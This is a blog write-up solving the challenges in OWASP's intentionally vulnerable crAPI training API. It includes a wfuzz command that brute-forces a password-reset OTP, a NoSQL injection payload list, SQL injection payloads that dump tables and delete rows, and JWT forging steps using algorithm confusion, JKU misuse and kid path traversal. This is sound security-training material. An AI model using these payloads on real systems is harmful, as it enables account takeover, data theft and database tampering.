---
title: (Portswigger/WebAcademy) - crAPI Writeup
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-12-21 09:00:00 +0200
categories: [Web Application, API]
tags: [Notes, Web Application, API]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post is all about the crAPI which is [OWASP's vulnerable web API application](https://github.com/OWASP/crAPI). It has few [challenges](https://github.com/OWASP/crAPI/blob/develop/docs/challenges.md) across all TOP 10 API Vulnerabilities. In total 15 challenges/vulnerabilities and 2 secret ones.

> **Overview - crAPI**
> 
> At a high level, the crAPI application is modeled as a B2C application that allows any user to get their car servicing done by a car mechanic. A user can create an account on the WebApp, manage his/her cars, search for car mechanics, submit servicing request for any car, and purchase car accessories from the vendor. The WebApp also has a community section where users can contribute with blog posts and comments.
> 
> The crAPI application, by design, does not implement all of its functionalities in the most secure manner. In other words, it deliberately exposes security vulnerabilities that can be exploited by any security enthusiast who is playing with the application. For more details on the vulnerabilities see the challenges.md
>
> Source: https://github.com/OWASP/crAPI/blob/develop/docs/overview.md

---

**The Plan**

I'll start with recon (for completion purposes) and then i'll document each finding under each vulnerability type. 

I'll be using Kali Linux and following tools:

- Burp Suite Community
- Postman
- ffuf
- wfuzz
- jwt_token

## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [Start - Login and](#start---login-and)
  - [Setting up Postman to Reverse Engineer an API](#setting-up-postman-to-reverse-engineer-an-api)
  - [Mitmproxy and Swagger creation](#mitmproxy-and-swagger-creation)
- [Challenges](#challenges)
  - [1. BOLA](#1-bola)
    - [Challenge 1 - Access details of another user’s vehicle](#challenge-1---access-details-of-another-users-vehicle)
    - [Challenge 2 - Access mechanic reports of other users](#challenge-2---access-mechanic-reports-of-other-users)
  - [2. Broken User Authentication](#2-broken-user-authentication)
    - [Challenge 3 - Reset the password of a different user](#challenge-3---reset-the-password-of-a-different-user)
  - [3. Excessive Data Exposure](#3-excessive-data-exposure)
    - [Challenge 4 - Find an API endpoint that leaks sensitive information of other users](#challenge-4---find-an-api-endpoint-that-leaks-sensitive-information-of-other-users)
    - [Challenge 5 - Find an API endpoint that leaks an internal property of a video](#challenge-5---find-an-api-endpoint-that-leaks-an-internal-property-of-a-video)
  - [4. Rate Limiting](#4-rate-limiting)
    - [Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature](#challenge-6---perform-a-layer-7-dos-using-contact-mechanic-feature)
  - [5. BFLA](#5-bfla)
    - [Challenge 7 - Delete a video of another user](#challenge-7---delete-a-video-of-another-user)
  - [6. Mass Assignment](#6-mass-assignment)
    - [Challenge 8 - Get an item for free](#challenge-8---get-an-item-for-free)
    - [Challenge 9 - Increase your balance by $1,000 or more](#challenge-9---increase-your-balance-by-1000-or-more)
    - [Challenge 10 - Update internal video properties](#challenge-10---update-internal-video-properties)
  - [7. Injections](#7-injections)
    - [(SSRF) - Challenge 11 - Make crAPI send an HTTP call to "www.google.com" and return the HTTP response.](#ssrf---challenge-11---make-crapi-send-an-http-call-to-wwwgooglecom-and-return-the-http-response)
    - [(NoSQLi) - Challenge 12 - Find a way to get free coupons without knowing the coupon code.](#nosqli---challenge-12---find-a-way-to-get-free-coupons-without-knowing-the-coupon-code)
    - [(SQLi) - Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database](#sqli---challenge-13---find-a-way-to-redeem-a-coupon-that-you-have-already-claimed-by-modifying-the-database)
      - [Getting Databases](#getting-databases)
      - [Getting Tables (all)](#getting-tables-all)
      - [Getting columns from `user_details`](#getting-columns-from-user_details)
      - [Finding applied coupons columns](#finding-applied-coupons-columns)
      - [Dumping applied coupon table](#dumping-applied-coupon-table)
      - [Changing Values in the row UPDATE/DELETE](#changing-values-in-the-row-updatedelete)
    - [(Unauthenticated Access) - Challenge 14 - Find an endpoint that does not perform authentication checks for a user.](#unauthenticated-access---challenge-14---find-an-endpoint-that-does-not-perform-authentication-checks-for-a-user)
    - [(Vulnerable JWT) - Challenge 15 - Find a way to forge valid JWT Tokens](#vulnerable-jwt---challenge-15---find-a-way-to-forge-valid-jwt-tokens)
      - [Algorithm Confusion](#algorithm-confusion)
      - [Invalid Signature Vulnerability](#invalid-signature-vulnerability)
      - [JKU Misuse Vulnerability](#jku-misuse-vulnerability)
      - [KID Path Traversal Vulnerability](#kid-path-traversal-vulnerability)

# Start - Login and 

First of all, we should be able to get onto login page if our crAPI instance is working as intended:

![picture 1](/assets/images/a87775a3b848eb5936e581b443b99f18b65085d6bc5169d3b20e121de90f6e2b.png)  

**I suggest naming the instance using /etc/hosts file into something like crapi.local or similar and point it to localhost/127.0.0.1, just to distinguish it better**

Let's have a Burp (or other proxy) running and let's sign up and login.

![picture 2](/assets/images/e3511b39145c04220994233e9a4700d573e7d4aba02268a457e2b8d1da7c8bdb.png)  

We can notice in the requests that there are some signs of API that're being used:

![picture 3](/assets/images/12e4a1a385f7aa75aff9bcf982c152a8b0bb9bc7a56e742b14ee657b3c08b2a0.png)  

We can see that Sitemap has been populated with those paths as well.

![picture 4](/assets/images/1224864fb98c80bebca48c51de7333967ad2b8fcf7f27c3d7571aa0a7767a5c2.png)  

Obviously we cannot say for sure that this is the only endpoint out there.

We can do **wordlist directory enumeration** with tools like gobuster, wfuzz or FFUF. I like FFUF the most so i'll run FFUF against the target using `swagger-wordlist.txt` from [assetnote](https://wordlists.assetnote.io)

![picture 5](/assets/images/371b8fe3581ad57c321ac2af8e72164baedfbcef64b405a4cff0c19d172e6fdf.png)  

The problem at this point is that i see different status codes and cannot sort them out immediately.

> It is important to get understanding how APP (or Web Application) work. In the next chapter i'll run the app and reverse engineer the API.

## Setting up Postman to Reverse Engineer an API

This are basic settings:

![picture 6](/assets/images/d4681c0282e73175afdde720c3aed21f8c7960bd14ed2621911e6afdf626acad.png)  

I've also set an additional filter to my url `crapi.local`. I've also filtered out `.css,.map,.js`... Oh and don't forget to setup browser to the right proxy afterwards. 

> For emails that are being sent from the app itself, you should be able to read them on port 8025 where `MailHog` is running

We can add requests to collection (if we've chosen our requests to `History` and not the collection itself)

![picture 7](/assets/images/5b938f0906276dcdf53ae1e08c5cc4e913a9db0c90f846999f74a6a59147e1f6.png)  

... This is what we have so far:

![picture 8](/assets/images/c57447185f59be15c7f83dc603b40574ee25e8c3772df508ea154b56357d5108.png)  

> We have to decide if this kind of documentation and reversing process is viable for us or not. Considering the size of the API for `crAPI` application, we can sort and document the endpoints by hand. 

There is not a single way how to document the API, but we can take existing documentation as a reference. We can take a look at `Explore` function in our Postman.

![picture 9](/assets/images/1e970481047de16320587ed15d10d63fb54f3493b9e05761f7884738c5bc975c.png)

## Mitmproxy and Swagger creation

Let's run all requests again by browsing the app and pipe them through [mitmproxy](https://github.com/mitmproxy/mitmproxy)

I've ran `mitmweb` using `-w` option which writes flows into a file and i've used another port then default `8090`.

```
mitmweb --listen-port 8090 -w crapi_flow
```

We should get a list of requests and should look like this:

![picture 11](/assets/images/522eb60e8e75178410789b83d0ac0b306dcf9909641861737f6de3e592554051.png)  

After we're done we can save the flows (we can also set filter e.g., `/api`) and run `mitmproxy2swagger`:

```
mitmproxy2swagger -i flows -o swagger.yaml --examples -f flow -p "http://crapi.local:8888"
```

We can import swagger file to an editor or into postman directly. There is also online instance running at `https://editor.swagger.io` where we can upload YAML and edit it.

![picture 13](/assets/images/c7e67b8e48686eadcfd72de336747052bd5e7e622f9f22807e383e6093eec05b.png)  

> If we would just want the list of endpoints, we could just use `mitmproxy2swagger -i flows -o swagger_no_examples.yaml -f flow -p "http://crapi.local:8888"` without `--examples` tag.

```
 luka@yokai  ~/crapi_vapi  cat swagger_no_examples.yaml 
openapi: 3.0.0
info:
  title: flows Mitmproxy2Swagger
  version: 1.0.0
servers:
- url: http://crapi.local:8888
  description: The default server
paths: {}
x-path-templates:
# Remove the ignore: prefix to generate an endpoint with its URL
# Lines that are closer to the top take precedence, the matching is greedy
- ignore:/community/api/v2/community/posts
- ignore:/community/api/v2/community/posts/recent
- ignore:/community/api/v2/community/posts/v6HRovghs98ZdmzcBdaY7B
- ignore:/community/api/v2/community/posts/v6HRovghs98ZdmzcBdaY7B/comment
- ignore:/community/api/v2/coupon/validate-coupon
- ignore:/identity/api/auth/login
- ignore:/identity/api/auth/signup
- ignore:/identity/api/v2/user/change-email
- ignore:/identity/api/v2/user/dashboard
- ignore:/identity/api/v2/user/pictures
- ignore:/identity/api/v2/user/reset-password
- ignore:/identity/api/v2/user/verify-email-token
- ignore:/identity/api/v2/user/videos
- ignore:/identity/api/v2/user/videos/{id}
- ignore:/identity/api/v2/user/videos/29
- ignore:/identity/api/v2/user/videos/convert_video
- ignore:/identity/api/v2/vehicle/add_vehicle
- ignore:/identity/api/v2/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location
- ignore:/identity/api/v2/vehicle/resend_email
- ignore:/identity/api/v2/vehicle/vehicles
- ignore:/workshop/api/mechanic
- ignore:/workshop/api/mechanic/
- ignore:/workshop/api/merchant/contact_mechanic
- ignore:/workshop/api/shop/orders
- ignore:/workshop/api/shop/orders/{id}
- ignore:/workshop/api/shop/orders/2
- ignore:/workshop/api/shop/orders/all
- ignore:/workshop/api/shop/orders/return_order
- ignore:/workshop/api/shop/products
- ignore:/workshop/api/shop/return_qr_code
```

I really like to have a list like this in front of me. What do we see almost immediately? E.g., `/workshop` does not use `/v2/`. This is also a good base to create a wordlist using endpoints above.

If we upload our `swagger.json` to the `Postman`, we'll see that it's very well ordered:

![picture 14](/assets/images/a940ec2e938f461fb68f7dcb1bb92895f963c54fe1c6cfe9c87fb19c24389383.png)  

# Challenges

## 1. BOLA
> If this was rewal engagement, it would be wise or necesarry to add an additional user which we could attack.

### Challenge 1 - Access details of another user’s vehicle

We have to pay attention to where we can read other users data. Most obvious would be any kind of IDs.

One such request is `{{baseUrl}}/identity/api/v2/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location`. 

![picture 1](/assets/images/8ad64324b2de0f5e0cbb9daf6889a761f3c296fc1d9ea012f5818d95f47c41f2.png)  

Although we cannot simply brute-force the UUID, we can find it elsewhere

![picture 2](/assets/images/cecda7191ee647106c28327635c561658190ec7e7c4cdaad1f4c386c5c2903d2.png)  

And we can find cars location if we have knowledge of other cars UUID:

![picture 3](/assets/images/1f9d7de35a287f65865f8708853943f3787bdf006dcfc5d7310d4e46d8c46249.png)  

- Vulnerable Endpoint: `{{baseUrl}}/identity/api/v2/vehicle/9882ead6-1c5f-48eb-a0e7-408ffa0dbbf8/location`

### Challenge 2 - Access mechanic reports of other users

This BOLA vulnerability has been hidden on plain sight, as we first need to send a request for report where link will get generated

![picture 4](/assets/images/c7cc16222654bf32984986322fb36fbd665ed35b5cb138280aa673a39b33a66b.png)  

- Request sent: `{{baseUrl}}/workshop/api/mechanic/receive_report?mechanic_code=TRAC_JHN&problem_details=repair&vin=9XPLG11UTSQ720977`

This is a new endpoint which was unknown until now: {{baseUrl}}/workshop/api/mechanic/mechanic_report`

- Vulnerable Endpoint: `{{baseUrl}}/workshop/api/mechanic/mechanic_report?report_id=8`

![picture 5](/assets/images/ab9dc9e0fcf0f3e7de3225b705fcf03b229ec6e26fb6dc752c19be3c5bd25bc8.png)  

## 2. Broken User Authentication

### Challenge 3 - Reset the password of a different user

We can reset password for any user (this is not a vulnerability!)

![picture 7](/assets/images/e2a7f57878b368794d10aa5aba053e883e5c019efa848da08080f04f657079cb.png)  

Interestingly, there are 2 versions:
- `/identity/api/auth/v2/check-otp` (found / guessed)
- `/identity/api/auth/v3/check-otp` (default)

Long story short, `v2` is missing rate-limiting, so we can simply brute-force the OTP.

```
wfuzz -z range,0000-9999 -u http://crapi.local:8888/identity/api/auth/v2/check-otp -d '{"email": "victim@cybersec-research.space","otp":"FUZZ","password":"SSSaaasss!!!"}' -H "Content-Type: application/json" --hw 5 -v
```

![picture 6](/assets/images/40f4d0ff1325746b046c550d080efa6570a367a849d85e6a240b27cec5e8d031.png)  

- Vulnerable Endpoint: `/identity/api/auth/v2/check-otp`

## 3. Excessive Data Exposure

### Challenge 4 - Find an API endpoint that leaks sensitive information of other users

![picture 15](/assets/images/7e2efd2e8cb24bce84b2aa542a6e9136280020c12df47eceb88c73a32357bb1f.png)  

Vulnerable Endpoint:

- `/community/api/v2/community/posts/recent`
- `/community/api/v2/community/posts/:{id}`
- `/community/api/v2/community/posts/:{id}/comment`

At least information that's marked in the screenshot, did not have to be exposed in the response. 

### Challenge 5 - Find an API endpoint that leaks an internal property of a video

![picture 16](/assets/images/6e584a3c2ac84fe619d55466a4ffdedb855383564d46ce0d7274af40f850bc8c.png)  

Vulnerable Endpoint:

- `/identity/api/v2/user/videos`
- `/identity/api/v2/user/videos/:{id}`

## 4. Rate Limiting

### Challenge 6 - Perform a layer 7 DoS using ‘contact mechanic’ feature

## 5. BFLA

Here we're searching for basically the same as BOLA, just with a crucial difference - we're not reading but changing stuff, so we might have to send other HTTP Verbs like `PUT, DELETE, POST`.

### Challenge 7 - Delete a video of another user

There were no endpoints found using `DELETE` HTTP Verb, but i haven't yet been actively searching for them to.

When trying things around, following `endpoint` replies with error

![picture 8](/assets/images/621f2798d5f378445aeb758d6f5a925fdf7f345c722153b2f558157311f775d8.png)  

Video with `32` ID belongs to another user. Error message says we should use admin API, and if we do that, we can delete the video.

![picture 9](/assets/images/b2ef892e87075d3c97f28fb15ec7821110bc3a79af94da9bae260b8d564a3690.png)  

- Vulnerable Endpoint: `/identity/api/v2/admin/videos/:id`

## 6. Mass Assignment

For **Mass Assignment** i wanted to try some automation using `arjun`, but actually more than that, i wanted to quickly have a list of host+endpoints which i could use for different tools. I've exported the collection from Postman and used gron+grep+sed+awk+sort to get a list.

```
 luka@yokai  ~/crapi_vapi  gron crapi_flow\ Mitmproxy2Swagger.postman_collection.json | fgrep "originalRequest.url.raw" | awk -F"=" '{print $2}' | sed 's/{{baseUrl}}/http:\/\/crapi.local:8888/' | cut -d'"' -f2| sed 's/{{ver}}/v1/' | sort -u
http://crapi.local:8888/community/api/v1/community/posts
http://crapi.local:8888/community/api/v1/community/posts/recent
http://crapi.local:8888/community/api/v1/community/posts/v6HRovghs98ZdmzcBdaY7B
http://crapi.local:8888/community/api/v1/community/posts/v6HRovghs98ZdmzcBdaY7B/comment
http://crapi.local:8888/community/api/v1/coupon/validate-coupon
http://crapi.local:8888/identity/api/auth/login
http://crapi.local:8888/identity/api/auth/signup
http://crapi.local:8888/identity/api/v1/user/change-email
http://crapi.local:8888/identity/api/v1/user/dashboard
http://crapi.local:8888/identity/api/v1/user/pictures
http://crapi.local:8888/identity/api/v1/user/reset-password
http://crapi.local:8888/identity/api/v1/user/verify-email-token
http://crapi.local:8888/identity/api/v1/user/videos
http://crapi.local:8888/identity/api/v1/user/videos/:id
http://crapi.local:8888/identity/api/v1/user/videos/:id?video_id
http://crapi.local:8888/identity/api/v1/vehicle/add_vehicle
http://crapi.local:8888/identity/api/v1/vehicle/c6acc7f0-14d2-4642-a2ea-2b63967834ff/location
http://crapi.local:8888/identity/api/v1/vehicle/resend_email
http://crapi.local:8888/identity/api/v1/vehicle/vehicles
http://crapi.local:8888/workshop/api/mechanic/
http://crapi.local:8888/workshop/api/merchant/contact_mechanic
http://crapi.local:8888/workshop/api/shop/orders
http://crapi.local:8888/workshop/api/shop/orders/:id
http://crapi.local:8888/workshop/api/shop/orders/:id?order_id
http://crapi.local:8888/workshop/api/shop/products
```

I would now just fix the IDs and create a list for `v2` and `v3`.

```
cat hosts_crapi.txt | sed 's/v1/v2/' | anew hosts_crapi.txt
cat hosts_crapi.txt | sed 's/v1/v3/' | anew hosts_crapi.txt
```

### Challenge 8 - Get an item for free

We can set status to `returned` by using PUT method

![picture 12](/assets/images/d402cce6823cfc862a02c96563be41b1606531ade02dc78ce23bb464efa26d6d.png).

Funds will be returned.

Vulnerable Endpoint: `{{baseUrl}}/workshop/api/shop/orders/:id` (PUT)

### Challenge 9 - Increase your balance by $1,000 or more

We can use negative numbers to increase our balance.

![picture 10](/assets/images/8bfea667585e85c8570cfed78bd9be9ed2cbd9f3f7be8fea24141b38408cff64.png) 

We can also create new product with negative numbers that will increase funds on our balance.

![picture 11](/assets/images/f25571cd1c270deafe8ab3675426bab3fdbd7a5c36a14c5ecd802110d33b409e.png)  


Vulnerable Endpoint: 
- `{{baseUrl}}/workshop/api/shop/orders` (POST)
- `{{baseUrl}}/workshop/api/shop/products` (POST)

### Challenge 10 - Update internal video properties

In the following Mass Assignment vulnerability it is possible to change parameter which isn't included in the default request.

![picture 13](/assets/images/b8695872e0e6bd77a266d844e4d327a2fdf45f84480ed2a49be4f38042ef6caf.png)  

Vulnerable Endpoint: `{{baseUrl}}/identity/api/v2/user/videos/:id` (PUT)

## 7. Injections
### (SSRF) - Challenge 11 - Make crAPI send an HTTP call to "www.google.com" and return the HTTP response.

SSRF happens where we can enter another URL which will be visited from the server side.

![picture 14](/assets/images/22f5e4aa47410383c97319b3d584b2b8223522af4638fcc7e8573ea0d39a19b6.png)  

... and i can see corresponding request on `webhook.site`.

![picture 15](/assets/images/60c8e1a2d13290210e2fe93c9f0614f1b35ca1741923118306d5ace2b5871af4.png) 

We can also see authorization header leak, as well as all parameters.

Vulnerable Endpoint: `{{baseUrl}}/workshop/api/merchant/contact_mechanic` (POST - `mechanic_api`)25

### (NoSQLi) - Challenge 12 - Find a way to get free coupons without knowing the coupon code.
After running NOSQLi Payloads through collection runner which was set like this:

![picture 19](/assets/images/22775ffa7fa0ff90ed915da3254e5fec86ae3803c61848c611a9de447d768f98.png)  

Only potential vulnerable requests were chosen. Injection that caught my attention was `"coupon":{"gt":""}`.

I've sent the request to Burp and this is the wordlist that i've used.

```
"coupon_code[$ne]":1
"coupon_code[$regex]":"^adm"
"coupon_code[$regex]":".{25}"
"coupon_code[$eq]":"admin"
"coupon_code[$ne]":"admin"
"coupon_code[$nin][admin]":"admin"
"coupon_code[$regex]":".*"
"coupon_code[$exists]":true
"coupon_code": {"$ne": null} 
"coupon_code": {"$ne": "foo"} 
"coupon_code": {"$gt": undefined}
"coupon_code": {"$gt":""}
```

We can see that we get coupon in response:

![picture 17](/assets/images/3270a127cbc98c90c66c2654b01234863de3bf910542b9db17f2180b728fb66e.png)  

We can even get a better one:

![picture 18](/assets/images/480a996240b7e9c8e0738c81d4d62de3d3fdc452676d2f4bd2f0eda22ce9902f.png)  

Vulnerable Endpoint: `/community/api/v2/coupon/validate-coupon` (POST - "coupon_code")

### (SQLi) - Challenge 13 - Find a way to redeem a coupon that you have already claimed by modifying the database

We've found some coupons *in previous challenge*. 

![picture 23](/assets/images/85d7a8a57287f5199d12dcb5d53a3da8053c24cf3403c7db1d68ea0819bb5059.png)  

We've redeemed those and now we cannot redeem same token anymore? Not a problem. Endpoint is vulnerable to SQL Injection.

![picture 24](/assets/images/39a97ab3f114094d55ea56d5515cf1f84770bea163de2978c5cec579825d7333.png)  

*From here, i'll just post body from each request*

#### Getting Databases

```
{"coupon_code":"blind' UNION ALL select string_agg(datname,',') FROM pg_database OFFSET 0--","amount":125}

{"message":"postgres,crapi,template1,template0 Coupon code is already claimed by you!! Please try with another coupon code"}
```

#### Getting Tables (all)

```
{"coupon_code":"blind' UNION ALL SELECT string_agg(table_name,',') FROM information_schema.tables --","amount":125}

{"message":"otp_token,profile_video,user_details,vehicle_model,vehicle_details,vehicle_location,vehicle_company,pg_statistic,pg_type,user_login,otp,django_migrations,pg_foreign_table,pg_authid,pg_shadow,pg_statistic_ext_data,pg_roles,mechanic,service_request,pg_settings,pg_file_settings,pg_hba_file_rules,product,order,applied_coupon,pg_config,pg_shmem_allocations,pg_backend_memory_contexts,pg_available_extension_versions,health_check_db_testmodel,pg_user_mapping,pg_stat_xact_user_functions,pg_replication_origin_status,pg_subscription,pg_attribute,pg_proc,pg_class,pg_attrdef,pg_constraint,pg_inherits,pg_index,pg_operator,pg_opfamily,pg_opclass,pg_am,pg_amop,pg_amproc,pg_language,pg_stat_archiver,pg_stat_bgwriter,pg_stat_wal,pg_stat_progress_analyze,pg_stat_progress_vacuum,pg_stat_progress_cluster,pg_stat_progress_create_index,pg_stat_progress_basebackup,pg_stat_progress_copy,pg_largeobject_metadata,...SNIP...applicable_roles,administrable_role_authorizations,check_constraint_routine_usage,character_sets,check_constraints,collations,collation_character_set_applicability,column_column_usage,column_domain_usage,routines,column_privileges,role_column_grants,column_udt_usage,columns,constraint_column_usage,routine_column_usage,...SNIP...,views,triggers,udt_privileges,foreign_data_wrappers,role_udt_grants,data_type_privileges,usage_privileges,role_usage_grants,user_defined_types,element_types,view_column_usage,view_routine_usage,_pg_foreign_servers,_pg_foreign_table_columns,column_options,_pg_foreign_data_wrappers,foreign_table_options,foreign_data_wrapper_options,foreign_server_options,foreign_servers,_pg_foreign_tables,user_mapping_options,foreign_tables,_pg_user_mappings Coupon code is already claimed by you!! Please try with another coupon code"}
```

#### Getting columns from `user_details`

```
{"coupon_code":"blind' UNION ALL SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='user_details' --","amount":125}

{"message":"id,available_credit,picture,user_id,name,status Coupon code is already claimed by you!! Please try with another coupon code"}
```

#### Finding applied coupons columns

```
{"coupon_code":"blind' UNION ALL SELECT string_agg(column_name,',') FROM information_schema.columns WHERE table_name='applied_coupon' --","amount":125}

{"message":"id,user_id,coupon_code Coupon code is already claimed by you!! Please try with another coupon code"}
```

#### Dumping applied coupon table
```
{"coupon_code":"blind' UNION ALL SELECT string_agg(concat(id||','||user_id||','||coupon_code),';') FROM applied_coupon --","amount":125}
```

#### Changing Values in the row UPDATE/DELETE

Now either modfy (UPDATE) the row or delete it.

```
UPDATE applied_coupon SET coupon_code='' WHERE user_id=8
```

DELETE the row with our user_id=8
```
{"coupon_code":"blind';DELETE FROM applied_coupon WHERE user_id=8 --","amount":125}
```

We'll get Server Error but PSQL Query has been executed and we can apply our coupon again.

![picture 20](/assets/images/2a3c640b28c9558db48d01a2715c489b4c7c491fd14acacc7b9454233abb43de.png)  

Output from SQLMAP:

![picture 21](/assets/images/8600e45a5a2da0c071e2129579d65be961deeb81a646aae5b12ef997ac96f111.png)  

### (Unauthenticated Access) - Challenge 14 - Find an endpoint that does not perform authentication checks for a user.

Running Collection in Postman **without** token has returned no 401/403 errors on following Endpoint:

- `http://crapi.local:8888/workshop/api/mechanic/mechanic_report?report_id=1`

```
 luka@yokai  ~/crapi_vapi  curl http://crapi.local:8888/workshop/api/mechanic/mechanic_report\?report_id\=15 -s | jq
{
  "id": 15,
  "mechanic": {
    "id": 1,
    "mechanic_code": "TRAC_JHN",
    "user": {
      "email": "jhon@example.com",
      "number": ""
    }
  },
  "vehicle": {
    "id": 28,
    "vin": "9XPLG11UTSQ720977",
    "owner": {
      "email": "luka@cybersec-research.space",
      "number": "123123123"
    }
  },
  "problem_details": "repair",
  "status": "Pending",
  "created_on": "21 January, 2023, 07:36:27"
}
```

### (Vulnerable JWT) - Challenge 15 - Find a way to forge valid JWT Tokens

I highly suggest checking out [Portswigger's Web Academy](https://portswigger.net/web-security/jwt)

#### Algorithm Confusion

Public Key has been found on `.well-known/jwks.json`. This will be used in Algorithm Confusion attack.

![picture 22](/assets/images/a290021fdb301318e51ed5126244f71db0bfe6c403a94a7d66c90fc4a7ca4cc0.png)  

I will be using Burp's `JWT Editor` extension which is also available for Community Edition. 

Now let's copy the key JWT Editor and create new `RSA` key.

![picture 25](/assets/images/6bac536a8e3c5a86089096c509d2ce99ace1ff2b268cd71bf6ac4e1bf00b161f.png)  

Save the key and copy it's public key in PEM format and BASE64 encode it.

![picture 26](/assets/images/f21c9fb44c46ccc7bf5c28163a1bee028baf2b2d05c56e6e3f817f9200547b3d.png)  

Now create `New Symmetric Key` and copy the BASE64 encoded PEM public key into `k` value.

We should now be able to sign JWT tokens. (Sign as HS256! not RS256)

![picture 27](/assets/images/a33fd6ef4127e80f763db0a22d6e8b14f6d3e0eeae740bfa4c414c1d4b35fa8c.png)  

Change `alg` to `HS256` and when signing `Don't modify header.`

![picture 29](/assets/images/7436b5aa99c49076c1589fb7ea1322d692ca67895cb75d3c23679cb202c75eeb.png)  

We can basically take over any account.

![picture 28](/assets/images/cd3b3cde29e38c9f83bd019fa7cce413e4353a3053e8f1886e35b8b25c79f061.png)

#### Invalid Signature Vulnerability

What we've done above is great but reality is that Signature isn't really being verified, meaning we can take over any account and don't even need to re-sign the JWT token. This can be tested simply by changing values like `sub` and JWT token will work.

#### JKU Misuse Vulnerability

The server supports the jku parameter in the JWT header. However, it fails to check whether the provided URL belongs to a trusted domain before fetching the key.

For this attack, we'll create a `New RSA Token` in `JWT Editor` and save it.

![picture 30](/assets/images/2a754a2f8809297311b42fcf26053778e27573ca0fd426531eaf00e5f2658785.png)  

We'll copy public key in PEM format

![picture 31](/assets/images/50793dccef08fe158ed1e3e223b642999489fe76d0f41331d9d9d6dbaaaaef2e.png)  

... and paste the key on our web server in following format:

```
{
  "keys:[
    KEY COMES HERE
  ]
}
```

Start the webserver (if not already running).

Using `JWT Editor` we can modify `jku`, `kid` and (if we want to) the `sub` values.

![picture 33](/assets/images/1b666b52cd807bd3063612d71b3f20c178b277679798c742c5f23463445a34a0.png)  

When we sign and send a request, we should see traffic on our web server.

![picture 32](/assets/images/79c36c98eb9591e2db4f5a2533be49df0c0e327c2c34b6ad9b80051f507d7c7a.png)  

Response should be successful.

![picture 34](/assets/images/28f9a02fc92f34873b2e67994ac513346194ca37e80908823653c4dc77d3ba8d.png)  

#### KID Path Traversal Vulnerability

In order to verify the signature, the server uses the kid parameter in JWT header to fetch the relevant key from its filesystem.

For this attack we'll need `Symmetric Key` ready from `JWT Editor`. 

![picture 19](/assets/images/c37f2adf7aba95768e1b700e714d8459570661b178e15d67c14f92fac0a349e1.png)  

Exchange the `k` value with `AA==` (this is not necesarry for an attack, but it's just workaround for Burp)

![picture 36](/assets/images/2160a8f1a12444414a613d0c60a69c61048a3aaee391c842b922be84530e7940.png)  

We will have to add/change the values accordingly where `kid` is going to point to traversed `../../../../../../../../dev/null` and we'll use our `Symmetric Key` to sign the JWT token.

![picture 37](/assets/images/e096ab497a3423ee0b12582e425aee477440d882347fdffe45af3b4e63d08f3f.png)  

